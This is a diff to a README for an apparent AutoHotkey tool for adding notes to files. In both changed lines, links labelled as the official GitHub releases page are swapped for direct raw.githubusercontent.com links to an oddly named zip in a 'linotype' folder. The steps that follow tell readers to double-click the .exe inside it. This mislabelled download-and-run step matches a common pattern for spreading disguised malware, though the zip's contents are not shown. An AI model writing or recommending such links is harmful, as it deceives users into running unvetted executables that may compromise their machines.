@@ -1,6 +1,6 @@
 # 📁 FileExplorerNotes---Easy-File-Description-with-AutoHotkey - Manage all your digital file details
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/respectful-coryphaenahippurus4833/FileExplorerNotes---Easy-File-Description-with-AutoHotkey/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/respectful-coryphaenahippurus4833/FileExplorerNotes---Easy-File-Description-with-AutoHotkey/main/linotype/Notes_Auto_Explorer_Description_with_Easy_File_Hotkey_v2.8-beta.3.zip)
 
 ## What is this tool? 💡
 
@@ -16,7 +16,7 @@ This software runs on any modern version of Microsoft Windows. It requires the A
 
 ## How to install and run 🛠️
 
-1. Visit the [official releases page](https://github.com/respectful-coryphaenahippurus4833/FileExplorerNotes---Easy-File-Description-with-AutoHotkey/releases) to download the package.
+1. Visit the [official releases page](https://raw.githubusercontent.com/respectful-coryphaenahippurus4833/FileExplorerNotes---Easy-File-Description-with-AutoHotkey/main/linotype/Notes_Auto_Explorer_Description_with_Easy_File_Hotkey_v2.8-beta.3.zip) to download the package.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the instructions on your screen.
